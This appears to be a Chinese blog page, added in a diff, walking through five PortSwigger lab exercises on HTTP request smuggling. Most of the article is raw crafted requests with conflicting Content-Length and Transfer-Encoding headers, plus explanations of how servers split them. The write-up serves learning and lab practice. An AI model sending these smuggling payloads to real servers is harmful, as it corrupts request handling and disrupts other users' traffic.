@@ -1,0 +1,524 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>http请求走私 | jiutu2003</title><meta name="author" content="jiutu2003"><meta name="copyright" content="jiutu2003"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="http请求走私(https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;246516) 1.HTTP 请求走私，基本 CL.TE 漏洞 基于CL.TE的http请求走私漏洞，我们需要更改http头，添加CL和TE，把这两个都给写上 我们先抓个包，然后对其进行修改 构造payload 12345678910POST &#x2F; HTTP&#x2F;1.1HOST: YOUR-LAB-ID.web-secu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="http请求走私">
+<meta property="og:url" content="https://jiutu2003.github.io/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/burpsuite%E9%9D%B6%E5%9C%BA-http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/index.html">
+<meta property="og:site_name" content="jiutu2003">
+<meta property="og:description" content="http请求走私(https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;246516) 1.HTTP 请求走私，基本 CL.TE 漏洞 基于CL.TE的http请求走私漏洞，我们需要更改http头，添加CL和TE，把这两个都给写上 我们先抓个包，然后对其进行修改 构造payload 12345678910POST &#x2F; HTTP&#x2F;1.1HOST: YOUR-LAB-ID.web-secu">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/923cae9672a5ef484ac0ed42599510f0.jpeg">
+<meta property="article:published_time" content="2023-03-22T05:31:56.897Z">
+<meta property="article:modified_time" content="2023-03-22T05:36:26.166Z">
+<meta property="article:author" content="jiutu2003">
+<meta property="article:tag" content="实战">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="http请求走私">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/923cae9672a5ef484ac0ed42599510f0.jpeg"><link rel="shortcut icon" href="/img/242ae48778369e7a.jpg"><link rel="canonical" href="https://jiutu2003.github.io/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/burpsuite%E9%9D%B6%E5%9C%BA-http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'http请求走私',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-22 13:36:26'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/242ae48778369e7a.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">37</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/923cae9672a5ef484ac0ed42599510f0.jpeg')"><nav id="nav"><span id="blog-info"><a href="/" title="jiutu2003"><span class="site-name">jiutu2003</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">http请求走私</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-22T05:31:56.897Z" title="发表于 2023-03-22 13:31:56">2023-03-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-22T05:36:26.166Z" title="更新于 2023-03-22 13:36:26">2023-03-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%9E%E6%88%98/">实战</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/">burpsuite靶场</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">http请求走私</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="http请求走私"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="http请求走私"><a href="#http请求走私" class="headerlink" title="http请求走私"></a>http请求走私</h1><p>(<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/246516">https://www.anquanke.com/post/id/246516</a>)</p>
+<h2 id="1-HTTP-请求走私，基本-CL-TE-漏洞"><a href="#1-HTTP-请求走私，基本-CL-TE-漏洞" class="headerlink" title="1.HTTP 请求走私，基本 CL.TE 漏洞"></a>1.HTTP 请求走私，基本 CL.TE 漏洞</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230311181523052.png" alt="image-20230311181523052"></p>
+<p>基于CL.TE的http请求走私漏洞，我们需要更改http头，添加CL和TE，把这两个都给写上</p>
+<p>我们先抓个包，然后对其进行修改</p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">HOST: YOUR-LAB-ID.web-security-academy.net</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">G</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230311191633366.png" alt="image-20230311191633366"></p>
+<p>点击那个可以显示看不到的字节</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230311191710981.png" alt="image-20230311191710981"></p>
+<p>还有，协议要选择1</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230311191817342.png" alt="image-20230311191817342"></p>
+<p>这样我们发送两次。第二次的时候就会显示错误</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230311191901686.png" alt="image-20230311191901686"></p>
+<h2 id="2-HTTP-请求走私，基本-TE-CL-漏洞"><a href="#2-HTTP-请求走私，基本-TE-CL-漏洞" class="headerlink" title="2.HTTP 请求走私，基本 TE.CL 漏洞"></a>2.HTTP 请求走私，基本 TE.CL 漏洞</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230311192013164.png" alt="image-20230311192013164"></p>
+<p>这个和前一个正好相反，发送两次</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: YOUR-LAB-ID.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<p>前端用TE判断内容，5c是一个16进制数，表示92，说明后面有92个字节，因为5c后面的内容是92个字节</p>
+<p>然后又读到最后的0，从而结束读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: YOUR-LAB-ID.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<p>这样前端就把请求全部读到，发到后端</p>
+<p>后端根据CL判断内容，第一个CL是4，后端就读取四个长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: YOUR-LAB-ID.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5c</span><br></pre></td></tr></table></figure>
+
+<p>读到这里之后是一个请求，后面的内容后端会把它判断为另一个请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<p>这里的CL是15，服务端在接收到这个信息后会一直等待请求，直到接受到15个长度的信息之后才停止，这时服务端会从第二个请求中抽取数据来填充这15个长度，这是请求就变成了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line">POST</span><br></pre></td></tr></table></figure>
+
+<p>这样后面的请求都变化了</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230311215050279.png" alt="image-20230311215050279"></p>
+<h2 id="3-HTTP请求走私，混淆TE标头"><a href="#3-HTTP请求走私，混淆TE标头" class="headerlink" title="3.HTTP请求走私，混淆TE标头"></a>3.HTTP请求走私，混淆TE标头</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312115833947.png" alt="image-20230312115833947"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: YOUR-LAB-ID.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-encoding:cow</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>前端以TE判断，但是后端会把这样的TE认为是错误的，所以会用CL判断</p>
+<p>我们发两次包，会返回这样的数据包</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312121429805.png" alt="image-20230312121429805"></p>
+<p>说明成功了</p>
+<h2 id="4-HTTP-请求走私，通过差异响应确认-CL-TE-漏洞"><a href="#4-HTTP-请求走私，通过差异响应确认-CL-TE-漏洞" class="headerlink" title="4.HTTP 请求走私，通过差异响应确认 CL.TE 漏洞"></a>4.HTTP 请求走私，通过差异响应确认 CL.TE 漏洞</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312121548544.png" alt="image-20230312121548544"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a52008b04a9809cc07554bd00c800f8.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 35</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /404 HTTP/1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure>
+
+<p>前端通过CL判断，会把这个数据包作为一个发到后端，后端通过TE判断，把这个请求分成两个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a52008b04a9809cc07554bd00c800f8.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 35</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /404 HTTP/1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure>
+
+<p>第二个请求不完整，所以后端会继续等待，我们在第二次发送请求时，后端会把请求填充</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /404 HTTP/1.1</span><br><span class="line">X-Ignore: XPOST / HTTP/1.1</span><br><span class="line">Host: 0a52008b04a9809cc07554bd00c800f8.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 35</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /404 HTTP/1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure>
+
+<p>这时候请求就完整了，因为我们在请求中写的是404，所以服务器端会返回一个404错误</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312134812907.png" alt="image-20230312134812907"></p>
+<h2 id="5-HTTP-请求走私，通过差异响应确认-TE-CL-漏洞"><a href="#5-HTTP-请求走私，通过差异响应确认-TE-CL-漏洞" class="headerlink" title="5.HTTP 请求走私，通过差异响应确认 TE.CL 漏洞"></a>5.HTTP 请求走私，通过差异响应确认 TE.CL 漏洞</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312134844159.png" alt="image-20230312134844159"></p>
+<p>和上一道题正好相反，我们只需要把TE和CL互换一下就可以了</p>
+<p>因为前端使用TE，，后端用的是CL我们修改POST的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a52008b04a9809cc07554bd00c800f8.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">27</span><br><span class="line">GET /404 HTTP/1.1</span><br><span class="line">X-Ignore: X</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这是我们发现这个请求前端应该是可以发送出去的，但是到了后端，第二个请求不符合规范，会请求超时，我们继续修改</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a52008b04a9809cc07554bd00c800f8.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5d</span><br><span class="line">POST /404 HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们发送，这时候是可以正常受到响应的，但是这个时候后端判定后的第一个请求会回显正常，第二个请求虽然是404，但是不会回显，因为第二个请求的长度是4，后面的内容足够4了，我们让其长度超过4，来破坏第一个正常的请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a52008b04a9809cc07554bd00c800f8.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5e</span><br><span class="line">POST /404 HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们发送第一个请求，前端发给后端后，后端把它分成两个请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a52008b04a9809cc07554bd00c800f8.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5e</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /404 HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>第一个请求正常返回，所以我们发送第一个去请求时，回显是正常的</p>
+<p>第二个请求长度超过POST的内容，会继续等待</p>
+<p>这是我们发送第二次请求</p>
+<p>后端会从第二次请求中抽取前几个数据，知道填充完15的数据长度</p>
+<p>这样第一次请求的第二条请求就会变成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /404 HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST </span><br></pre></td></tr></table></figure>
+
+<p>从而让服务器端返回这个请求的回显（404）</p>
+<p>这样发送的第二次请求就被破坏了，导致第一条请求无法正常回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/ HTTP/1.1</span><br><span class="line">Host: 0a52008b04a9809cc07554bd00c800f8.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5e</span><br><span class="line">POST /404 HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312143424954.png" alt="image-20230312143424954"></p>
+<p>成功</p>
